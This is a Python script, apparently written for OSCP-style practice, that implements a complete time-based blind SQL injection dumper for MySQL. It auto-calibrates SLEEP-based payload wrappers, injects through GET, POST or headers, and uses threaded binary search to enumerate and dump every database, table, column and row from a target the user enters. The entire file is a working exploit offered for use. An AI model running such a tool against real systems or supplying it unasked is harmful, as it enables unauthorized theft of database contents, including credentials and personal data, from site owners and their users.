#!/usr/bin/env python3
# ---------------------------------------------------------------------------
# Time-based blind SQLi dumper (MySQL) - interactive, auto-calibrating, threaded
# Oracle = RESPONSE TIME. A condition is wrapped so the DB sleeps when TRUE:
# slow reply (>= threshold) = TRUE, instant reply = FALSE.
#
# Robustness: instead of one hardcoded SLEEP wrapper, the script tries several
# wrapper forms at startup and locks in the first that passes the 1=1/1=2
# check - so SELECT, INSERT/header, and filtered contexts all just work.
#
# Speed: the per-character binary search is sequential, but characters are
# independent, so after finding the length each position is dumped in its own
# thread. Real speedup ~= thread count.
#
# Methods: GET (query string), POST (body), HEADER (e.g. X-Forwarded-For).
# Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
# ---------------------------------------------------------------------------
import requests
import time
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- Interactive config ----------------------------------------------------
print("=== time-based SQLi dumper ===")
METHOD       = input("Request method GET, POST or HEADER           : ").strip().upper()
if METHOD not in ("GET", "POST", "HEADER"):
    METHOD = "GET"
URL          = input("Target URL                                   : ").strip()
# For GET/POST this is the param name (e.g. id). For HEADER it is the header
# name whose value is logged into a query (e.g. X-Forwarded-For).
INJ_FIELD    = input("Injectable field/header name                 : ").strip()
OTHER_FIELD  = input("Other POST field name (blank if none)        : ").strip() if METHOD == "POST" else ""
OTHER_VALUE  = input("Other field value (anything, e.g. x)         : ").strip() if OTHER_FIELD else ""
# Template with [INJECT] where the sleep expression is spliced in. It only
# needs the break-out; the wrapper (IF/SLEEP) is added and auto-picked for you.
# SELECT context (login/id):  1' OR [INJECT]-- -   or   admin' AND [INJECT]-- -
# HEADER/INSERT context:      1' AND [INJECT]-- -
TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()
DELAY        = int(input("SLEEP seconds on TRUE (e.g. 3)               : ").strip() or "3")
THREADS      = int(input("Threads (e.g. 8; lower if box is fragile)    : ").strip() or "8")
# A reply this slow (or slower) counts as TRUE. Below DELAY to absorb jitter.
THRESHOLD    = DELAY * 0.7

# --- Wrapper forms tried during calibration (first that fires wins) --------
# Each turns a boolean {cond} into "sleep DELAY seconds iff cond is TRUE".
# Ordered from most common context to most specialised.
WRAPPERS = [
    "IF(({cond}),SLEEP({d}),0)",                       # bare - SELECT ... WHERE
    "(SELECT IF(({cond}),SLEEP({d}),0))",              # subquery - INSERT/header
    "(SELECT IF(({cond}),SLEEP({d}),0) FROM DUAL)",    # subquery + FROM DUAL
    "(SELECT IF(({cond}),SLEEP({d}),0) FROM information_schema.tables LIMIT 1)",
    "ELT(({cond}),SLEEP({d}))",                        # ELT fires arg when cond=1
]

# --- Request sender (GET -> query, POST -> body, HEADER -> header) ----------
# requests' module-level calls open their own connection per request, so this
# is safe to call from many threads at once (no shared session/cookies).
def send(payload):
    if METHOD == "HEADER":
        return requests.get(URL, headers={INJ_FIELD: payload})
    if METHOD == "GET":
        params = {INJ_FIELD: payload}
        if OTHER_FIELD:
            params[OTHER_FIELD] = OTHER_VALUE
        return requests.get(URL, params=params)
    data = {INJ_FIELD: payload}
    if OTHER_FIELD:
        data[OTHER_FIELD] = OTHER_VALUE
    return requests.post(URL, data=data)

def build(cond, wrapper):
    return TEMPLATE.replace("[INJECT]", wrapper.format(cond=cond, d=DELAY))

def timed(cond, wrapper):
    start = time.time()
    send(build(cond, wrapper))
    return time.time() - start

# --- Calibration: pick the wrapper that actually delays --------------------
CHOSEN = None
def calibrate():
    global CHOSEN
    for w in WRAPPERS:
        try:
            true_slow  = timed("1=1", w) >= THRESHOLD   # TRUE must sleep
            false_fast = timed("1=2", w) <  THRESHOLD   # FALSE must not
        except Exception:
            continue
        if true_slow and false_fast:
            CHOSEN = w
            return w
    return None

print("\n[*] Calibrating wrapper (sends a few DELAY-second requests)...")
if not calibrate():
    print("[!] No wrapper fired. TRUE never delayed or FALSE also delayed.")
    print("    - Check the template breaks out of the query correctly.")
    print("    - HEADER values must use real spaces, never + or %20.")
    print("    - The parameter may simply not be injectable here.")
    print(f"    method   = {METHOD}")
    print(f"    template = {TEMPLATE!r}")
    print(f"    delay    = {DELAY}s, threshold = {THRESHOLD}s")
    sys.exit(1)
print(f"[+] Using wrapper: {CHOSEN}\n")

# MySQL system schemas to skip when dumping "all" (still listed on screen)
SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]

# --- Core oracle + extraction ----------------------------------------------
def oracle(condition):
    """One boolean question -> True if the reply was delayed."""
    start = time.time()
    send(build(condition, CHOSEN))
    return (time.time() - start) >= THRESHOLD

def extract_char(subquery, pos):
    """Binary search the byte value (0-255) of the char at position pos."""
    lo, hi = 0, 255
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"ascii(substring(({subquery}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def get_length(subquery):
    """Binary search the length of the result (so threads know how many chars)."""
    lo, hi = 0, 4096
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"length(({subquery}))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

_print_lock = threading.Lock()
def extract_string(subquery, label=None):
    """Find the length, then dump every character position in parallel.
    Threads make time-based practical; order is restored by index."""
    n = get_length(subquery)
    if n == 0:
        if label is not None:
            sys.stdout.write(f"{label}\n")
        return ""
    result = [""] * n
    done = 0
    def work(i):
        v = extract_char(subquery, i + 1)
        result[i] = chr(v) if v else ""
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = {ex.submit(work, i): i for i in range(n)}
        for _ in as_completed(futures):
            if label is not None:
                done += 1
                with _print_lock:
                    sys.stdout.write(f"\r{label}{done}/{n} chars")
                    sys.stdout.flush()
    s = "".join(result)
    if label is not None:
        sys.stdout.write(f"\r{label}{s}{' ' * 8}\n")
    return s

# --- ASCII table renderer --------------------------------------------------
def render_table(headers, rows):
    widths = [len(h) for h in headers]
    for row in rows:
        for i in range(len(headers)):
            cell = row[i] if i < len(row) else ""
            widths[i] = max(widths[i], len(cell))
    bar = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    def fmt(cols):
        cells = [(cols[i] if i < len(cols) else "").ljust(widths[i]) for i in range(len(headers))]
        return "| " + " | ".join(cells) + " |"
    print("      " + bar)
    print("      " + fmt(headers))
    print("      " + bar)
    for row in rows:
        print("      " + fmt(row))
    print("      " + bar)

# --- Enumeration helpers ---------------------------------------------------
def get_databases():
    q = "SELECT group_concat(schema_name) FROM information_schema.schemata"
    s = extract_string(q, label="[*] databases: ")
    return s.split(",") if s else []

def get_tables(db):
    q = (f"SELECT group_concat(table_name) FROM information_schema.tables "
         f"WHERE table_schema='{db}'")
    s = extract_string(q, label=f"[*] tables in {db}: ")
    return s.split(",") if s else []

def get_columns(db, table):
    q = (f"SELECT group_concat(column_name) FROM information_schema.columns "
         f"WHERE table_schema='{db}' AND table_name='{table}'")
    s = extract_string(q, label=f"[*] columns in {db}.{table}: ")
    return s.split(",") if s else []

def dump_table(db, table):
    cols = get_columns(db, table)
    if not cols:
        print(f"      (no columns found for {db}.{table})")
        return
    # One single-arg group_concat per column - same shape that dumps names.
    # (Caveat: a value containing a comma would misalign that column.)
    columns_data = []
    for c in cols:
        q = f"SELECT group_concat({c}) FROM {db}.{table}"
        s = extract_string(q, label=f"    {c}: ")
        columns_data.append(s.split(",") if s else [])
    n = max((len(cd) for cd in columns_data), default=0)
    rows = [[cd[i] if i < len(cd) else "" for cd in columns_data] for i in range(n)]
    print()
    render_table(cols, rows)

# --- Interactive chooser ---------------------------------------------------
def choose(items, label):
    print(f"\nAvailable {label}s:")
    print("   0) ALL")
    for idx, it in enumerate(items, 1):
        print(f"   {idx}) {it}")
    while True:
        pick = input(f"Select {label} (number, 0=all): ").strip()
        if pick == "0":
            return items
        if pick.isdigit() and 1 <= int(pick) <= len(items):
            return [items[int(pick) - 1]]
        print("   invalid choice, try again.")

# --- Main walk -------------------------------------------------------------
def main():
    print("[*] Enumerating databases...")
    all_dbs = get_databases()
    print(f"[+] Found: {', '.join(all_dbs)}")

    candidates = [d for d in all_dbs if d not in SKIP_DBS] or all_dbs
    chosen_dbs = choose(candidates, "database")

    for db in chosen_dbs:
        print(f"\n[DB] {db}")
        tables = get_tables(db)
        if not tables:
            print("    (no tables)")
            continue
        if len(chosen_dbs) == 1:
            tables = choose(tables, "table")

        for table in tables:
            print(f"  [TABLE] {db}.{table}")
            dump_table(db, table)

    print("\n[*] Done.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
